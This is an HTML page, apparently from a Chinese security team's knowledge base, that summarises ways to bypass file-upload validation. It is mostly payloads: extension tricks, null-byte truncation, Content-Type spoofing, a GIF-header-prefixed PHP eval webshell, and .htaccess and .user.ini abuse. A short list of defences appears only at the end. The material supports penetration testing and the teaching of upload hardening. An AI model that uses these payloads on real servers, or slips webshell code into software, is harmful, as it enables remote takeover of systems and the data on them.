@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>文件上传漏洞绕过技术汇总 - XHSecTeam安全知识库</title>
+    <meta name="description" content="全面总结文件上传漏洞的各种绕过方法：后缀绕过、Content-Type绕过、文件头绕过、二次渲染绕过等实战技巧。">
+    <meta name="keywords" content="文件上传漏洞,Webshell,上传绕过,后缀绕过,文件头绕过,二次渲染">
+    <meta name="author" content="XHSecTeam">
+    <meta name="robots" content="index, follow">
+    
+    <link rel="stylesheet" href="../../static/css/common.css">
+    <script src="../../static/css/common.js"></script>
+    <script src="../../static/js/layout.js"></script>
+    <style>
+        .article-container { max-width: 1200px; margin: 0 auto; padding: 24px 32px 60px; }
+        .article-layout { display: grid; grid-template-columns: 1fr 280px; gap: 40px; }
+        .article-header { margin-bottom: 32px; }
+        .article-breadcrumb { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--text-tertiary); margin-bottom: 16px; }
+        .article-breadcrumb a { color: var(--text-secondary); text-decoration: none; }
+        .article-breadcrumb a:hover { color: var(--accent-green); }
+        .article-breadcrumb svg { width: 14px; height: 14px; fill: none; stroke: currentColor; stroke-width: 2; }
+        .article-title { font-size: 32px; font-weight: 800; color: var(--text-primary); line-height: 1.3; margin-bottom: 16px; }
+        .article-meta { display: flex; align-items: center; gap: 20px; flex-wrap: wrap; font-size: 13px; color: var(--text-secondary); }
+        .article-meta-item { display: flex; align-items: center; gap: 6px; }
+        .article-meta-item svg { width: 16px; height: 16px; fill: none; stroke: currentColor; stroke-width: 2; color: var(--text-tertiary); }
+        .article-badge { padding: 3px 10px; border-radius: 999px; font-size: 12px; font-weight: 600; background: rgba(239, 68, 68, 0.1); color: #dc2626; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .article-tags { display: flex; gap: 8px; margin-top: 16px; flex-wrap: wrap; }
+        .article-tag { padding: 4px 12px; border-radius: 999px; font-size: 12px; background: rgba(59, 130, 246, 0.08); color: #3b82f6; border: 1px solid rgba(59, 130, 246, 0.2); text-decoration: none; }
+        .article-content { background: rgba(255, 255, 255, 0.96); border: 1px solid rgba(148, 163, 184, 0.2); border-radius: 16px; padding: 32px; }
+        .article-content h2 { font-size: 22px; font-weight: 700; color: var(--text-primary); margin: 32px 0 16px; padding-bottom: 10px; border-bottom: 2px solid rgba(16, 185, 129, 0.3); }
+        .article-content h2:first-child { margin-top: 0; }
+        .article-content h3 { font-size: 18px; font-weight: 600; color: var(--text-primary); margin: 24px 0 12px; }
+        .article-content p { font-size: 15px; line-height: 1.8; color: var(--text-secondary); margin-bottom: 16px; }
+        .article-content ul { margin: 16px 0; padding-left: 24px; }
+        .article-content li { font-size: 15px; line-height: 1.8; color: var(--text-secondary); margin-bottom: 8px; }
+        .article-content code { background: rgba(16, 185, 129, 0.08); color: var(--accent-green); padding: 2px 8px; border-radius: 4px; font-family: monospace; font-size: 14px; }
+        .article-content pre { background: #1e293b; border-radius: 12px; padding: 20px; overflow-x: auto; margin: 20px 0; }
+        .article-content pre code { background: none; color: #e2e8f0; padding: 0; font-size: 13px; line-height: 1.6; }
+        .article-content table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 14px; }
+        .article-content th, .article-content td { padding: 12px 16px; text-align: left; border: 1px solid rgba(148, 163, 184, 0.2); }
+        .article-content th { background: rgba(248, 250, 252, 0.9); font-weight: 600; color: var(--text-primary); }
+        .article-sidebar { display: flex; flex-direction: column; gap: 20px; }
+        .article-toc { background: rgba(255, 255, 255, 0.96); border: 1px solid rgba(148, 163, 184, 0.2); border-radius: 12px; padding: 20px; position: sticky; top: 24px; }
+        .article-toc-title { font-size: 14px; font-weight: 600; color: var(--text-primary); margin-bottom: 14px; }
+        .article-toc-list { display: flex; flex-direction: column; gap: 10px; }
+        .article-toc-item { font-size: 13px; color: var(--text-secondary); text-decoration: none; padding-left: 12px; border-left: 2px solid transparent; }
+        .article-toc-item:hover { color: var(--accent-green); }
+        .article-nav { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 40px; padding-top: 32px; border-top: 1px solid rgba(148, 163, 184, 0.2); }
+        .article-nav-item { padding: 20px; background: rgba(255, 255, 255, 0.96); border: 1px solid rgba(148, 163, 184, 0.2); border-radius: 12px; text-decoration: none; }
+        .article-nav-item:hover { border-color: var(--accent-green); }
+        .article-nav-label { font-size: 12px; color: var(--text-tertiary); margin-bottom: 6px; }
+        .article-nav-title { font-size: 14px; font-weight: 600; color: var(--accent-green); }
+        .article-nav-item.next { text-align: right; }
+        @media (max-width: 960px) { .article-layout { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+    <div class="main-layout" style="margin-left: 0; margin-right: 0;">
+        <article class="content article-container" itemscope itemtype="https://schema.org/TechArticle">
+            <header class="article-header">
+                <nav class="article-breadcrumb">
+                    <a href="../index.html">知识库</a>
+                    <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
+                    <a href="../index.html?cat=websec">Web安全</a>
+                    <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
+                    <span>文件上传</span>
+                </nav>
+                <h1 class="article-title" itemprop="headline">文件上传漏洞绕过技术汇总</h1>
+                <div class="article-meta">
+                    <span class="article-badge">高危漏洞</span>
+                    <div class="article-meta-item">
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        <time datetime="2024-12-05">2024-12-05</time>
+                    </div>
+                    <div class="article-meta-item">
+                        <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                        <span>1,123 阅读</span>
+                    </div>
+                </div>
+                <div class="article-tags">
+                    <a href="#" class="article-tag">文件上传</a>
+                    <a href="#" class="article-tag">Webshell</a>
+                    <a href="#" class="article-tag">绕过技术</a>
+                </div>
+            </header>
+            
+            <div class="article-layout">
+                <div class="article-content" itemprop="articleBody">
+                    <h2 id="intro">一、文件上传漏洞概述</h2>
+                    <p>文件上传漏洞是Web应用中最严重的漏洞之一。攻击者通过上传恶意文件（如Webshell）到服务器，可以获取服务器的完全控制权限。</p>
+                    
+                    <h2 id="check">二、常见校验方式</h2>
+                    <table>
+                        <thead>
+                            <tr><th>校验类型</th><th>描述</th><th>绕过难度</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>前端JS校验</td><td>JavaScript检查文件类型</td><td>极易</td></tr>
+                            <tr><td>后缀名校验</td><td>检查文件扩展名</td><td>中</td></tr>
+                            <tr><td>Content-Type校验</td><td>检查MIME类型</td><td>易</td></tr>
+                            <tr><td>文件头校验</td><td>检查文件魔数</td><td>中</td></tr>
+                            <tr><td>二次渲染</td><td>重新处理图片</td><td>难</td></tr>
+                        </tbody>
+                    </table>
+                    
+                    <h2 id="suffix">三、后缀名绕过</h2>
+                    <h3>3.1 大小写绕过</h3>
+                    <pre><code>.Php .pHp .PHP .phP</code></pre>
+                    
+                    <h3>3.2 特殊后缀</h3>
+                    <pre><code># PHP可解析后缀
+.php3 .php4 .php5 .php7 .phtml .pht
+
+# ASP可解析后缀
+.asp .asa .cer .cdx
+
+# JSP可解析后缀
+.jsp .jspx .jspf</code></pre>
+                    
+                    <h3>3.3 双写绕过</h3>
+                    <pre><code>shell.pphphp → 过滤php后变成 shell.php</code></pre>
+                    
+                    <h3>3.4 特殊字符</h3>
+                    <pre><code># Windows特性
+shell.php. (点号)
+shell.php  (空格)
+shell.php::$DATA
+
+# 00截断（PHP<5.3.4）
+shell.php%00.jpg</code></pre>
+                    
+                    <h2 id="mime">四、Content-Type绕过</h2>
+                    <pre><code># 修改请求头
+Content-Type: image/jpeg
+Content-Type: image/png
+Content-Type: image/gif</code></pre>
+                    
+                    <h2 id="header">五、文件头绕过</h2>
+                    <pre><code># 在PHP代码前添加图片文件头
+GIF89a<?php @eval($_POST['cmd']);?>
+
+# 常见文件头
+GIF: GIF89a
+PNG: 89 50 4E 47
+JPG: FF D8 FF E0</code></pre>
+                    
+                    <h2 id="render">六、二次渲染绕过</h2>
+                    <p>对于会重新处理图片的场景，需要找到图片处理后不变的区域插入代码：</p>
+                    <ul>
+                        <li>使用脚本对比原图和渲染后图片的差异</li>
+                        <li>在不变区域插入Webshell代码</li>
+                        <li>GIF格式相对容易绕过</li>
+                    </ul>
+                    
+                    <h2 id="config">七、配置文件利用</h2>
+                    <pre><code># 上传.htaccess
+AddType application/x-httpd-php .jpg
+
+# 上传.user.ini
+auto_prepend_file=shell.jpg</code></pre>
+                    
+                    <h2 id="defense">八、防御措施</h2>
+                    <ul>
+                        <li>使用白名单校验文件后缀</li>
+                        <li>重命名上传文件，使用随机文件名</li>
+                        <li>上传目录禁止执行权限</li>
+                        <li>文件存储与Web目录分离</li>
+                        <li>对图片进行二次渲染处理</li>
+                    </ul>
+                </div>
+                
+                <aside class="article-sidebar">
+                    <nav class="article-toc">
+                        <h2 class="article-toc-title">目录</h2>
+                        <div class="article-toc-list">
+                            <a href="#intro" class="article-toc-item">一、漏洞概述</a>
+                            <a href="#check" class="article-toc-item">二、常见校验方式</a>
+                            <a href="#suffix" class="article-toc-item">三、后缀名绕过</a>
+                            <a href="#mime" class="article-toc-item">四、Content-Type绕过</a>
+                            <a href="#header" class="article-toc-item">五、文件头绕过</a>
+                            <a href="#render" class="article-toc-item">六、二次渲染绕过</a>
+                            <a href="#config" class="article-toc-item">七、配置文件利用</a>
+                            <a href="#defense" class="article-toc-item">八、防御措施</a>
+                        </div>
+                    </nav>
+                </aside>
+            </div>
+            
+            <nav class="article-nav">
+                <a href="ssrf-vulnerability-analysis.html" class="article-nav-item prev">
+                    <div class="article-nav-label">← 上一篇</div>
+                    <div class="article-nav-title">SSRF服务端请求伪造漏洞深度分析</div>
+                </a>
+                <a href="windows-privilege-escalation.html" class="article-nav-item next">
+                    <div class="article-nav-label">下一篇 →</div>
+                    <div class="article-nav-title">Windows提权技术完全手册</div>
+                </a>
+            </nav>
+        </article>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', async function() {
+            XHLayout.loadFooter();
+        });
+    </script>
+</body>
+</html>
